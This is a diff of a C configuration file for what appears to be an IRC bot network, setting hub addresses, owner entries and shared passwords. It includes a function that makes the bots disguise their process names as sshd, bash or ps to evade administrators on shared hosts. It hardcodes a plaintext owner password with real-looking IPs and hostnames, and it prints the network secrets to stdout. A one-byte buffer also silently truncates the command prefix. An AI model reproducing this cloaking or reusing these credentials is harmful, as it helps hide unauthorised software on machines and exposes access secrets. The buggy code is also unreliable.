@@ -1,90 +1,80 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-char netpass[15] = "kd8e3nchasd93dk"; //Just 15 random chars here.. (DO CHANGE)
+#define STR(x) x
 
-//This pass will be used to encrypt files and other important things...
-//Just MD5 some word and put the hash in here..
-char thepass[33] = "5f4dcc3b5aa765d61d8327deb882cf99";
+extern char *degarble(int, char *);
 
+char netpass[16], thepass[33], dcc_prefix[1], owners[2048], hubs[2048];
 
-
-//These are programs the leaf binaries will spoof as
-//Turning off spoofing is a bad idea.
-char *progname() {
-  switch (random() % 13) {
-    case 0: return "-bash";
-    case 1: return "ftp";
-    case 2: return "/usr/sbin/sshd";
-    case 3: return "man";
-    case 4: return "pine";
-    case 5: return "bash";
-    case 6: return "top";
-    case 7: return "last";
-    case 8: return "w";
-    case 9: return "ps ux";
-    case 10: return "bash";
-    case 11: return "./psybnc";
-    case 12: return "BitchX";
-  }
-  return "";
-}
-
-//dcc command prefix, usually is "."
-char    dcc_prefix[1] = "!";        /* Defines the command prefix */
-
-//Don't edit these two
-char owners[2048] = "";
-char hubs[2048] = "";
-
-void init_settings() {
-/* I put the owner/hubs here, because I don't need to encrypt them this way.
- * and adding code to encrypt them into the binary like ghost does would take
- * too much space and time, and I don't feel it is needed.
- * You can list an infinite amount of hosts and owners/hubs.
- * Be sure to read through this and comments below before attempting to
- * edit the initial strings.
- * Proper syntax, (NOTE THE COMMAS, SLASHES, AND THE SPACING.):
+//Change everything..
+#define NETPASS STR("kd8e3nchasd93dk")  //Just 15 random chars here..
+#define THEPASS STR("d166239eb0558fc14c25a0826d20286d") //this md5 hash will be used for various purposes..
+#define DCCPREFIX STR("!") //This is the cmd prefix for dcc, ie: .cmd could be "."
 
 
-//By "ip/hostname" I mean ip OR hostname, I highly recommend setting up dns for your hub with a hostname.
+//You can define an infinite ammount of hubs/owners.
+//All hubs must be added/defined in this, owners can be later added via partyline.
+//"ip/hostname" means ip OR hostname, I highly recommend setting up dns for your hubs with hostnames.
 
-char t_owners[2048] = "\
-nick pass *!u@host *!u@ip *!u@host *!u@host *!u@ip,\
-nick pass *!u@host\
-";
-char t_hubs[2048] = "\
-hubnick ip/hostname port 1 username username,\
-hubnick2 ip/hostname port 2 username username,\
-hubnick3 ip/hostname port 3 username username\
-";
-
+/*
  * Give your main hub the number 1...
  * The order of the hubs makes no difference, but be sure to give each
  * bot a unique number, starting from 1 and not skipping any numbers.
  * See the example below for what username is.
  *
- * Also do not put a comma at the end of the last entry for both hubs/owners.
- *
  */
 
 /* IT IS IMPERATIVE TO ADD THE TRAILING COMMA AND SLASH CORRECTLY */
 
+#define OWNERS STR("\
+nick pass *!u@host *!u@ip *!u@host *!u@host *!u@ip,\
+nick pass *!u@host -telnet!ident@host,\
+")
 
-//change these according to the above syntax.
-char t_owners[2048] = "\
-bryan Pass1234 *!bryan@botpack.net *!bryan@ip68-8-80-38.sd.sd.cox.net,\
-";
+#define HUBS STR("\
+hubnick ip/hostname port 1 username username,\
+hubnick2 ip/hostname port 2 username username,\
+hubnick3 ip/hostname port 3 username username,\
+")
 
-/* I use the username 'bryan' and '~sbp' because the shell login is bryan
- * but there is no identd running, so I include both.
- */
-char t_hubs[2048] = "\
-hub 66.252.27.116 9227 1 shatow,\
-war war.botpack.net 9227 2 bryan ~war\
-";
+#undef OWNERS
+#undef HUBS
 
-/* ------ DO NOT EDIT ------ */
-  sprintf(owners, "%s", t_owners);
-  sprintf(hubs, "%s", t_hubs);
+#define OWNERS STR("bryan Pass1234 *!bryan@botpack.net *!bryan@ip68-8-80-38.sd.sd.cox.net,")
+
+#define HUBS STR("hub 66.252.27.116 9227 1 shatow,war war.botpack.net 9227 2 bryan ~war,")
+
+
+//these are programs the leaf binaries will spoof as
+char *progname() {
+#ifdef S_PSCLOAK
+  switch (random() % 13) { //Total entries + 1
+    case 0: return STR("-bash");
+    case 1: return STR("ftp");
+    case 2: return STR("/usr/sbin/sshd");
+    case 3: return STR("man");
+    case 4: return STR("pine");
+    case 5: return STR("bash");
+    case 6: return STR("top");
+    case 7: return STR("last");
+    case 8: return STR("w");
+    case 9: return STR("ps ux");
+    case 10: return STR("bash");
+    case 11: return STR("./psybnc");
+    case 12: return STR("BitchX");
+  }
+#endif
+  return "";
+}
+
+/* ------ DO NOT EDIT BELOW THIS LINE ------ */
+
+void init_settings() {
+  snprintf(owners, sizeof owners, OWNERS);
+  snprintf(hubs, sizeof hubs, HUBS);
+  snprintf(netpass, sizeof netpass, NETPASS); 
+  snprintf(thepass, sizeof thepass, THEPASS);
+  snprintf(dcc_prefix, sizeof dcc_prefix, DCCPREFIX);
+printf("netpass: %s thepass: %s\n", netpass, thepass);
 }
